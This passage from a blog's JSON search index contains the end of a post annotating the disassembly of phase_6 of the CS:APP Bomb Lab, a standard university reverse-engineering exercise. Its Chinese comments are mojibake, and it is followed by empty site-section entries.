++rsi 19b4:\t48 83 fe 06 cmp $0x6,%rsi # å¾ªç¯ç»ˆæ­¢æ¡ä»¶ 19b8:\t75 d1 jne 198b \u0026lt;phase_6+0x93\u0026gt; # ä¸ç›¸ç­‰ç»§ç»­ 19ba:\t48 8b 5c 24 30 mov 0x30(%rsp),%rbx # ç°åœ¨æˆ‘ä»¬å·²ç»æŠŠæŒ‰ç…§è¾“å…¥æ•°å­—é¡ºåºèŠ‚ç‚¹æŒ‡å‘çš„åœ°å€æ”¾åœ¨äº†æ ˆä¸Šï¼ˆäººè¯ï¼Ÿï¼‰rbxä¸ºç¬¬ä¸€ä¸ªåœ°å€ 19bf:\t48 8b 44 24 38 mov 0x38(%rsp),%rax # raxæ˜¯ç¬¬äºŒä¸ªåœ°å€ 19c4:\t48 89 43 08 mov %rax,0x8(%rbx) # ä»¥ä¸‹å°±æ˜¯æŠŠé“¾è¡¨æŒ‰ç…§æˆ‘ä»¬è¾“å…¥çš„é¡ºåºè¿æ¥åœ¨ä¸€èµ·ï¼Œçœ‹ä¸æ˜ç™½å°±ç”»å›¾ 19c8:\t48 8b 54 24 40 mov 0x40(%rsp),%rdx 19cd:\t48 89 50 08 mov %rdx,0x8(%rax) 19d1:\t48 8b 44 24 48 mov 0x48(%rsp),%rax 19d6:\t48 89 42 08 mov %rax,0x8(%rdx) 19da:\t48 8b 54 24 50 mov 0x50(%rsp),%rdx 19df:\t48 89 50 08 mov %rdx,0x8(%rax) 19e3:\t48 8b 44 24 58 mov 0x58(%rsp),%rax 19e8:\t48 89 42 08 mov %rax,0x8(%rdx) 19ec:\t48 c7 40 08 00 00 00 movq $0x0,0x8(%rax) # 0å°±æ˜¯nullèŠ‚ç‚¹ 19f3:\t00 19f4:\tbd 05 00 00 00 mov $0x5,%ebp # rbp = 5 19f9:\teb 35 jmp 1a30 \u0026lt;phase_6+0x138\u0026gt; # è¿æ¥å®Œäº†ä¹‹åè·³è½¬ 19fb:\t49 83 c7 01 add $0x1,%r15 # è¿™æ˜¯åº”è¯¥æ˜¯ç¬¬ä¸€å±‚å¾ªç¯ 19ff:\t49 83 c6 04 add $0x4,%r14 # ä¸‹ä¸€ä¸ª 1a03:\t4c 89 f5 mov %r14,%rbp # åœ¨æˆåŠŸè¯»å–å…­ä¸ªæ•°å­—ä¹‹åè·³è½¬åˆ°è¿™é‡Œï¼Œrbpå­˜æ”¾rsp + 16åœ°å€ï¼ˆç¬¬ä¸€æ¬¡ï¼‰ 1a06:\t41 8b 06 mov (%r14),%eax # è¯»å–çš„ç¬¬ä¸€ä¸ªæ•°å­— 1a09:\t83 e8 01 sub $0x1,%eax # è¯»å–çš„æ•°å­—-1 1a0c:\t83 f8 05 cmp $0x5,%eax # å’Œ5ä½œæ¯”è¾ƒ 1a0f:\t0f 87 28 ff ff ff ja 193d \u0026lt;phase_6+0x45\u0026gt; # å¤§äº5çˆ†ç‚¸ï¼ˆè¿™æ„å‘³ç€ä¸èƒ½è¾“å…¥å¤§äº6çš„æ•°å­—ï¼‰ 1a15:\t41 83 ff 05 cmp $0x5,%r15d # r15åˆšåˆšèµ‹å€¼ä¸º1,ç°åœ¨å’Œ5ä½œæ¯”è¾ƒ 1a19:\t0f 8f 46 ff ff ff jg 1965 \u0026lt;phase_6+0x6d\u0026gt; # å¤§äº5è·³è½¬ï¼ˆåˆ°è¿™é‡Œä¸ºæ­¢ï¼Œç»è¿‡äº†ä¸€ä¸ªç±»ä¼¼äºå†’æ³¡æ’åºçš„æ¯”è¾ƒï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬è¾“å…¥çš„æ•°å­—ä¸èƒ½æœ‰é‡å¤çš„ä¹Ÿä¸èƒ½å¤§äº6ï¼‰ 1a1f:\t4c 89 fb mov %r15,%rbx # rbx = 1 1a22:\te9 2d ff ff ff jmp 1954 \u0026lt;phase_6+0x5c\u0026gt; 1a27:\t48 8b 5b 08 mov 0x8(%rbx),%rbx 1a2b:\t83 ed 01 sub $0x1,%ebp 1a2e:\t74 11 je 1a41 \u0026lt;phase_6+0x149\u0026gt;\t1a30:\t48 8b 43 08 mov 0x8(%rbx),%rax # è¿æ¥ä¹‹ååœ¨è¿™é‡Œ 1a34:\t8b 00 mov (%rax),%eax 1a36:\t39 03 cmp %eax,(%rbx) 1a38:\t7d ed jge 1a27 \u0026lt;phase_6+0x12f\u0026gt;\t# ä¹Ÿå°±æ˜¯è¯´é“¾è¡¨å¿…é¡»æ˜¯é€’å¢è¿˜æ˜¯é€’å‡çš„ä¸€ä¸ªé¡ºåºï¼Ÿ 1a3a:\te8 87 02 00 00 call 1cc6 \u0026lt;explode_bomb\u0026gt; 1a3f:\teb e6 jmp 1a27 \u0026lt;phase_6+0x12f\u0026gt; 1a41:\t48 8b 44 24 68 mov 0x68(%rsp),%rax 1a46:\t64 48 2b 04 25 28 00 sub %fs:0x28,%rax 1a4d:\t00 00 1a4f:\t75 0f jne 1a60 \u0026lt;phase_6+0x168\u0026gt; 1a51:\t48 83 c4 78 add $0x78,%rsp 1a55:\t5b pop %rbx 1a56:\t5d pop %rbp 1a57:\t41 5c pop %r12 1a59:\t41 5d pop %r13 1a5b:\t41 5e pop %r14 1a5d:\t41 5f pop %r15 1a5f:\tc3 ret 1a60:\te8 eb f7 ff ff call 1250 \u0026lt;__stack_chk_fail@plt\u0026gt; ä¸å®¹æ˜“ï¼Œç»ˆäºå†™å®Œäº†ã€‚\n","date":"9 March 2025","externalUrl":null,"permalink":"/tech/csappbomblab/","section":"Tech","summary":"","title":"CSAPP:BombLab","type":"tech"},{"content":" \u0026ldquo;My Heart Is In The Work.\u0026rdquo; \u0026mdash;Andrew Carnegie\n","date":"8 March 2025","externalUrl":null,"permalink":"/tech/","section":"Tech","summary":"","title":"Tech","type":"tech"},{"content":"","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"},{"content":"","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"}]